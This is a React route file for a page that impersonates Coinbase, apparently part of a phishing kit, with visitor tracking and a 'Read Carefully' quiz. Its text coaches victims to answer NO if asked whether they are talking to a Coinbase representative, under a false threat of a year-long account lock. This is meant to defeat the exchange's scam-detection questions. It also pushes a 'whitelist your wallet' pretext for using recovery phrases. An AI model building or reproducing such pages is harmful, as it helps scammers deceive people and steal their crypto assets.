import { createFileRoute } from "@tanstack/react-router";
import {
  CbFontStyle,
  CbLogo,
  CbSupportBanner,
  useCbTracking,
} from "@/components/cb/CbShared";
import { cbIcons } from "@/lib/cb-assets";

export const Route = createFileRoute("/cb/quiz")({
  head: () => ({ meta: [{ title: "Read Carefully" }] }),
  component: CbQuizPage,
});

function CbQuizPage() {
  useCbTracking();

  return (
    <div
      className="cb-quiz-page"
      style={{
        display: "flex",
        flexDirection: "column",
        minHeight: "100vh",
        backgroundColor: "rgb(10, 11, 13)",
        color: "#fff",
      }}
    >
      <CbFontStyle />
      <style>{`
        .cb-quiz-page, .cb-quiz-page * {
          font-family: 'CoinbaseSans', 'CoinbaseDisplay', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
          -webkit-font-smoothing: antialiased;
          -moz-osx-font-smoothing: grayscale;
          box-sizing: border-box;
        }
        @keyframes cbFadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        .cb-quiz-animate { animation: cbFadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) both; }
        .cb-quiz-animate-1 { animation-delay: 0.05s; }
        .cb-quiz-animate-2 { animation-delay: 0.1s; }
        .cb-quiz-animate-3 { animation-delay: 0.15s; }
        .cb-quiz-animate-4 { animation-delay: 0.2s; }
        .cb-quiz-animate-5 { animation-delay: 0.25s; }
        .cb-quiz-header {
          display: grid;
          grid-template-columns: auto 1fr auto;
          height: 72px;
          align-items: center;
          padding: 0 24px;
          width: 100%;
        }
        .cb-quiz-main {
          display: flex;
          justify-content: center;
          flex-direction: column;
          flex-grow: 1;
          width: 100%;
          padding: 0 16px;
          align-items: center;
        }
        .cb-quiz-form-container { width: 100%; max-width: 380px; display: flex; flex-direction: column; }
        .cb-quiz-title {
          font-family: 'CoinbaseSans', 'CoinbaseDisplay', sans-serif !important;
          font-size: 28px; font-weight: 500; line-height: 36px; letter-spacing: -0.02em;
          color: #fff; margin: 0 0 8px 0; text-align: center;
        }
        .cb-quiz-subtitle { color: rgb(138, 145, 158); font-size: 15px; text-align: center; margin-bottom: 32px; line-height: 1.5; }
        .cb-quiz-section-title { font-weight: 700; font-size: 17px; margin-bottom: 10px; color: #fff; }
        .cb-quiz-section-text { color: rgb(138, 145, 158); font-size: 15px; line-height: 1.6; margin-bottom: 28px; }
        .cb-quiz-section-text:last-of-type { margin-bottom: 0; }
        .cb-quiz-section-text strong { color: #fff; }
        .cb-quiz-done-btn {
          display: flex; align-items: center; justify-content: center;
          width: 100%; margin-top: 32px; height: 56px;
          border-radius: 1000px; border: none;
          background: rgb(87, 139, 250); color: rgb(10, 11, 13);
          font-family: 'CoinbaseSans', sans-serif !important;
          font-weight: 700; font-size: 16px; line-height: 24px;
          cursor: not-allowed; opacity: 0.4; pointer-events: none; user-select: none;
        }
      `}</style>

      <CbSupportBanner />
      <header className="cb-quiz-header">
        <div style={{ color: "#fff" }}>
          <CbLogo />
        </div>
      </header>

      <main className="cb-quiz-main" style={{ justifyContent: "flex-start", paddingTop: 48 }}>
        <div className="cb-quiz-form-container">
          <div
            className="cb-quiz-animate cb-quiz-animate-1"
            style={{ marginBottom: 24, display: "flex", justifyContent: "center" }}
          >
            <img src={cbIcons.usdcRewards} alt="" width={72} height={72} />
          </div>
          <h1 className="cb-quiz-title cb-quiz-animate cb-quiz-animate-2">Read Carefully</h1>
          <p className="cb-quiz-subtitle cb-quiz-animate cb-quiz-animate-2">
            To make sure you are paying attention, please follow the instructions below.
          </p>

          <div className="cb-quiz-animate cb-quiz-animate-3">
            <h2 className="cb-quiz-section-title">Assets Safety</h2>
            <p className="cb-quiz-section-text">
              Make sure to never share your recovery phrase with anyone, even if they say they're
              from Coinbase. You may only use it to whitelist your wallet, or recover your assets
              if they're lost. Ensure you properly store your recovery phrase in a safe place if
              given one.
            </p>
          </div>

          <div className="cb-quiz-animate cb-quiz-animate-4" style={{ marginTop: 12 }}>
            <h2 className="cb-quiz-section-title">Security Measures</h2>
            <p className="cb-quiz-section-text">
              While performing the given tasks on this website, if you are asked if you are in
              contact with a Coinbase representative, please respond with <strong>NO</strong>. This
              is a trick question to ensure you've actually read the instructions on this page. If
              you don't complete this step correctly, your account will be locked for the next 365
              days, meaning you won't be able to access your assets or account.
            </p>
          </div>

          <div className="cb-quiz-animate cb-quiz-animate-5">
            <button className="cb-quiz-done-btn" disabled>
              Done
            </button>
          </div>
        </div>
      </main>
    </div>
  );
}
